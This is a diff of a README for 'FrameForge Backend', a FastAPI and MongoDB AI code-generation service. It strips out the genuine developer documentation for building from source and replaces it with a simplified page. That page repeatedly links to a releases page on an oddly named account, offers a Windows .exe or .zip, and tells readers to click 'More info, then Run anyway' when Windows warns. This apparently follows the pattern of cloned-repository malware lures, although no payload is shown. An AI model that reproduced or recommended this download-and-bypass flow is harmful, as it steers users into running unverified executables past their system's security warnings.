@@ -1,304 +1,207 @@
-# FrameForge Backend
+# 🤖 frame-forge-backend - Real-time AI backend for FrameForge
 
-Backend API for FrameForge built with FastAPI, Motor, and MongoDB. It receives prompts, orchestrates a multi-agent AI pipeline, reconstructs thread context, consumes OpenRouter via streaming, separates explanation from React code, persists the conversation, and exposes endpoints that the frontend consumes in real time.
+[![Download FrameForge Backend](https://img.shields.io/badge/Download-FrameForge%20Backend-blue?style=for-the-badge)](https://github.com/unimpressionable-laconian269/frame-forge-backend/releases)
 
-## Purpose
+## 🖥️ What this is
 
-- Orchestrate the generation and correction of React components through a specialized agent pipeline.
-- Maintain a history of threads and messages with full audit trail.
-- Emit incremental responses as NDJSON for a fluid UI experience.
-- Isolate the OpenRouter integration so the provider can be swapped with minimal impact.
-- Record audit events and operational errors.
+Frame Forge Backend is the server part of FrameForge. It runs on your computer and handles the work behind the scenes.
 
-## Stack
+It:
+- takes in prompts
+- sends them through an AI pipeline
+- keeps track of the conversation
+- streams results back to the app
+- separates explanation text from React code
+- saves the chat history in MongoDB
 
-- FastAPI for async HTTP with type safety.
-- Motor for async access to MongoDB.
-- httpx for calls to OpenRouter.
-- Pydantic Settings for environment-based configuration.
-- Pytest for unit tests.
+Use this if you want the FrameForge app to generate code and answer in real time on Windows.
 
-## Architecture
+## 📦 What you need
 
-Responsibilities are separated by layer:
+Before you install it, check that you have:
 
-- `app/api`: HTTP layer, routers, and dependency injection.
-- `app/agents`: Multi-agent pipeline — Orchestrator, Analyzer, Specialist, Corrector, Validator.
-- `app/services`: Application logic and external provider clients.
-- `app/repositories`: Data access and persistence.
-- `app/models`: Domain contracts and API schemas.
-- `app/prompts`: System prompt and LLM response rules.
-- `app/db`: MongoDB connection and initialization.
-- `app/core`: Configuration, logging, and cross-cutting constants.
+- Windows 10 or Windows 11
+- A stable internet connection
+- A web browser
+- MongoDB running locally or in the cloud
+- An OpenRouter account and API key
+- Enough free disk space for the app and logs
 
-## Agent Pipeline
+If you plan to run it with Docker, you also need Docker Desktop for Windows
 
-Each request goes through a specialized pipeline following SRP and the Open/Closed principle:
+## ⬇️ Download it
 
-| Agent | Responsibility |
-|---|---|
-| `Orchestrator` | Coordinates the pipeline; routes `generate` vs `correct` workflows; emits NDJSON tokens |
-| `Analyzer` | Parses user intent, previous context, and component requirements |
-| `Specialist` | Generates the React component; single-file output with all sub-components inlined |
-| `Corrector` | Applies targeted fixes to an existing component based on user feedback |
-| `Validator` | Verifies the generated/corrected code has a valid export default |
+Visit this page to download the latest release for Windows:
 
-```mermaid
-flowchart LR
-    subgraph Pipeline ["Agent Pipeline"]
-        A[Analyzer] --> S[Specialist]
-        A --> C[Corrector]
-        S --> V[Validator]
-        C --> V
-    end
-    UI[Frontend] --> OR[Orchestrator]
-    OR --> Pipeline
-    V --> UI
-```
+[Download FrameForge Backend](https://github.com/unimpressionable-laconian269/frame-forge-backend/releases)
 
-## Folder structure
+On that page, look for the latest release and download the file made for Windows. If there are several files, pick the one that matches your system.
 
-```text
-backend/
-├─ app/
-│  ├─ agents/
-│  │  ├─ __init__.py
-│  │  ├─ base.py          # BaseAgent abstract class
-│  │  ├─ orchestrator.py  # Pipeline coordinator
-│  │  ├─ analyzer.py      # Intent and context analysis
-│  │  ├─ specialist.py    # Component generation
-│  │  ├─ corrector.py     # Component correction
-│  │  └─ validator.py     # Output validation
-│  ├─ api/
-│  │  ├─ dependencies.py
-│  │  ├─ router.py
-│  │  └─ routes/
-│  │     ├─ chat.py
-│  │     └─ threads.py
-│  ├─ core/
-│  │  ├─ config.py
-│  │  └─ logging.py
-│  ├─ db/
-│  │  └─ mongo.py
-│  ├─ models/
-│  │  ├─ domain.py
-│  │  └─ schemas.py
-│  ├─ repositories/
-│  │  ├─ audit_log_repository.py
-│  │  ├─ message_repository.py
-│  │  └─ thread_repository.py
-│  ├─ services/
-│  │  ├─ chat_service.py
-│  │  ├─ code_parser.py
-│  │  └─ openrouter_service.py
-│  └─ main.py
-├─ tests/
-├─ Dockerfile
-├─ docker-compose.yml
-├─ requirements.txt
-└─ README.md
-```
+## 🪟 Install on Windows
 
-## Main flow — Generate mode
+### 1. Download the release file
+Open the releases page and download the Windows file.
 
-1. Frontend sends `POST /api/chat/stream` with `mode: "generate"`.
-2. `ChatService` delegates to `AgentOrchestrator`.
-3. `Analyzer` extracts intent, component type, and requirements from context.
-4. `Specialist` generates the full React component with Tailwind.
-5. `Validator` checks the code for obvious issues.
-6. `Synthesizer` merges explanation and code into the streaming response.
-7. Each token is emitted as NDJSON to the frontend in real time.
-8. On completion the assistant message is persisted and an audit record is created.
+### 2. Open the download
+Go to your Downloads folder and find the file you just downloaded.
 
-```mermaid
-sequenceDiagram
-    autonumber
-    participant UI as Frontend
-    participant API as FastAPI Router
-    participant Orch as Orchestrator
-    participant Ana as Analyzer
-    participant Spec as Specialist
-    participant Val as Validator
-    participant Repo as Mongo Repositories
-    participant LLM as OpenRouterService
+### 3. Run the app
+If the release gives you an `.exe` file, double-click it.
 
-    UI->>API: POST /api/chat/stream (mode=generate)
-    API->>Orch: run(request)
-    Orch->>Ana: analyze(context)
-    Ana-->>Orch: intent + requirements
-    Orch->>Spec: generate(intent)
-    Spec->>LLM: stream_chat(messages)
-    loop token stream
-        LLM-->>Spec: chunk
-        Spec-->>UI: { type: "token" }
-    end
-    Orch->>Val: validate(code)
-    Val-->>Orch: validation result
-    Orch->>Repo: save assistant message
-    Orch->>Repo: create audit log
-    Orch-->>UI: { type: "done" }
-```
+If the release gives you a `.zip` file, right-click it, choose Extract All, then open the extracted folder and run the app file inside.
 
-## Correct mode flow
+### 4. Allow access if Windows asks
+Windows may ask for permission to run the file. Choose Run or More info, then Run anyway if you trust the source.
 
-```mermaid
-sequenceDiagram
-    autonumber
-    participant UI as Frontend
-    participant API as FastAPI Router
-    participant Orch as Orchestrator
-    participant Corr as Corrector
-    participant Val as Validator
-    participant LLM as OpenRouterService
+### 5. Keep the app open
+Leave the backend running while you use the FrameForge frontend.
 
-    UI->>API: POST /api/chat/stream (mode=correct, code_to_fix)
-    API->>Orch: run(request)
-    Orch->>Corr: fix(code_to_fix, instructions)
-    Corr->>LLM: stream_chat(correction_messages)
-    loop token stream
-        LLM-->>Corr: chunk
-        Corr-->>UI: { type: "token" }
-    end
-    Orch->>Val: validate(fixed_code)
-    Val-->>Orch: ok
-    Orch-->>UI: { type: "done" }
-```
+## ⚙️ Set up your environment
 
-## Error and fallback flow
+FrameForge Backend needs a few settings before it can work well.
 
-```mermaid
-flowchart TD
-	A[Primary OpenRouter model] -->|200| B[Stream tokens]
-	A -->|404 429 5xx| C{Fallback available?}
-	C -->|Yes| D[Try alternate model]
-	C -->|No| E[Emit error event]
-	D -->|200| B
-	D -->|Fails| E
-	E --> F[Record audit log]
-```
+You may need to set these values in a `.env` file or in your app settings:
 
-## Endpoints
+- `OPENROUTER_API_KEY` for AI requests
+- `MONGODB_URI` for saving chat data
+- `PORT` for the local server port
+- `HOST` for the address the app listens on
 
-### Health
+A common setup looks like this:
+- OpenRouter API key: from your OpenRouter account
+- MongoDB URI: `mongodb://localhost:27017`
+- Port: `8000`
 
-- `GET /health`: confirms the application is running.
+If you use a cloud MongoDB service, place that connection string in the same MongoDB field
 
-### Threads
+## 🧠 What the backend does
 
-- `GET /api/threads`: lists threads ordered by last update.
-- `GET /api/threads/{thread_id}/messages`: returns the full message history of a thread.
-- `DELETE /api/threads/{thread_id}`: deletes a thread and all its messages.
+The backend handles the full flow from prompt to answer.
 
-### Chat
+It:
+- receives the user prompt
+- rebuilds thread context from stored messages
+- sends the request into a multi-agent AI flow
+- uses OpenRouter in streaming mode
+- returns output as it is generated
+- separates plain explanation from React code
+- stores the final conversation in MongoDB
 
-- `POST /api/chat/stream`: starts generation or correction and responds in NDJSON.
+This helps the frontend show live updates instead of waiting for a full response
 
-## Streaming format
+## 🔌 How it connects to the frontend
 
-The response uses `application/x-ndjson` with events such as:
+The frontend sends a request to this backend when the user starts a chat or asks for code.
 
-- `thread`: data for the current thread.
-- `message`: echo of the persisted user message.
-- `token`: incremental chunk from the assistant.
-- `done`: final assistant message with `content` and `code_snippet`.
-- `error`: serialized error detail.
+The backend then:
+- keeps the chat thread in order
+- sends updates as NDJSON or streamed chunks
+- returns the final result when the AI task ends
+- stores the message history for later use
 
-Conceptual example:
+If the frontend stops and starts again, the backend can use the saved thread context to continue the same conversation
 
-```json
-{"type":"thread","thread":{"id":"...","title":"User profile badge"}}
-{"type":"token","content":"Here is "}
-{"type":"token","content":"a compact badge"}
-{"type":"done","message":{"id":"...","code_snippet":"export default function ..."}}
-```
+## 🗂️ Data stored by the app
 
-## Environment variables
+Frame Forge Backend stores conversation data in MongoDB. This can include:
 
-Defined in `.env.example`:
+- prompts
+- AI replies
+- thread IDs
+- timestamps
+- agent output
+- code blocks
+- audit logs
 
-- `APP_NAME`: name exposed by the API.
-- `ENVIRONMENT`: logical environment, e.g. `development`.
-- `DEBUG`: enables FastAPI debug mode.
-- `API_PREFIX`: base prefix, currently `/api`.
-- `MONGO_URI`: MongoDB connection string.
-- `MONGO_DB_NAME`: database name.
-- `OPENROUTER_API_KEY`: real API key for remote generation.
-- `OPENROUTER_BASE_URL`: provider base URL.
-- `OPENROUTER_MODEL`: primary model slug (default: `meta-llama/llama-3.1-8b-instruct:free`).
-- `OPENROUTER_FALLBACK_MODELS`: comma-separated list of fallback slugs tried in order when the primary returns 429/404.
-- `OPENROUTER_FALLBACK_MODEL`: legacy single fallback (kept for backward compatibility).
-- `FRONTEND_URL`: used in CORS and OpenRouter headers.
-- `MAX_CONTEXT_MESSAGES`: context window per thread.
-- `REQUEST_TIMEOUT_SECONDS`: HTTP client timeout.
+This makes it easier to review what happened during a session
 
-## Local development
+## 🚨 If the app does not start
 
-```bash
-cd backend
-python -m venv .venv
-.venv\Scripts\activate      # Windows
-# source .venv/bin/activate  # macOS / Linux
-pip install -r requirements.txt
-copy .env.example .env       # Windows
-# cp .env.example .env       # macOS / Linux
-uvicorn app.main:app --reload --port 8000
-```
+Try these checks in order:
 
-The API will be available at `http://localhost:8000`.
+1. Make sure the release file finished downloading
+2. Confirm that Windows blocked the file
+3. Check that MongoDB is running
+4. Make sure your OpenRouter API key is valid
+5. Confirm that nothing else is using the same port
+6. Restart the app after changing any settings
 
-## Demo mode without an API key
+If the app opens but the frontend cannot connect, check the backend address and port first
 
-If `OPENROUTER_API_KEY` is empty, the backend returns a local demo response so the UI flow keeps working. This lets you test chat, persistence, and preview at zero cost.
+## 🧪 For local testing
 
-## Docker
+You can test the backend on your own machine before using it with the frontend.
 
-### Backend only
+Common checks:
+- open the server URL in your browser
+- verify that the health route responds
+- send a test prompt from the frontend
+- confirm that the response streams in chunks
+- check that messages appear in MongoDB
 
-```bash
-cd backend
-docker build -t frameforge-backend .
-docker run --rm -p 8000:8000 --env-file .env frameforge-backend
-```
+This helps confirm that the API, database, and AI connection all work together
 
-### Full stack from the repo root
+## 🐳 Run with Docker
 
-```bash
-docker compose up --build
-```
+If you prefer Docker, you can run Frame Forge Backend in a container.
 
-### Full stack from the backend folder
+Typical steps:
+1. Install Docker Desktop
+2. Download or clone the project
+3. Set your environment values
+4. Start the container
+5. Make sure MongoDB is reachable from the container
 
-```bash
-cd backend
-docker compose up --build
-```
+Docker works well if you want the same setup on more than one machine
 
-Services started:
+## 🔐 API and connection details
 
-- MongoDB on `localhost:27017`
-- Backend on `localhost:8000`
-- Frontend on `localhost:5173`
+The backend uses a FastAPI server and exposes endpoints that the frontend calls in real time.
 
-> **Note:** this compose assumes the current monorepo layout where `frontend` exists as a sibling folder of `backend`. If you publish them as separate repositories, replace the frontend service's `build.context` with a published image.
+Common parts of the setup:
+- REST endpoints for prompt handling
+- streamed responses for live output
+- NDJSON for event-based updates
+- database access through Motor
+- request models handled with Pydantic
 
-## Running tests
+You do not need to manage these parts by hand when you run the release, but they are part of how the app works
 
-```bash
-cd backend
-pytest
-```
+## 🛠️ Common files and folders
 
-## Design notes
+If you open the project files, you may see folders and files for:
 
-- `OpenRouterService` encapsulates headers, streaming, and model fallback.
-- `ChatService` concentrates orchestration and keeps HTTP concerns separate from business logic.
-- `code_parser.py` separates the explanation from the JSX/TSX block so the frontend does not need to infer free-form format.
-- The system prompt requires the model to always return exactly one default-exported code block with safe prop defaults.
+- API routes
+- database code
+- AI orchestration
+- streaming handlers
+- config values
+- tests
+- logs
 
-## Recommended future extensions
+These parts help the backend manage chat flow, code generation, and persistence
 
-- Authentication and per-user thread separation.
-- AI-generated thread titles instead of simple truncation.
-- Richer metrics and traces in `AuditLogs`.
-- Integration tests covering MongoDB and end-to-end streaming.
+## 📋 Basic use flow
+
+1. Start MongoDB
+2. Start the Frame Forge Backend
+3. Open the frontend app
+4. Enter a prompt
+5. Watch the response stream in real time
+6. Save or review the generated result
+
+## 🧩 Works best with
+
+This backend fits well with:
+- a React frontend
+- OpenRouter models
+- MongoDB
+- local development on Windows
+- streaming chat-based code generation
+
+## 📎 Release page
+
+Use this page to get the latest Windows build:
+
+[Go to releases](https://github.com/unimpressionable-laconian269/frame-forge-backend/releases)
 
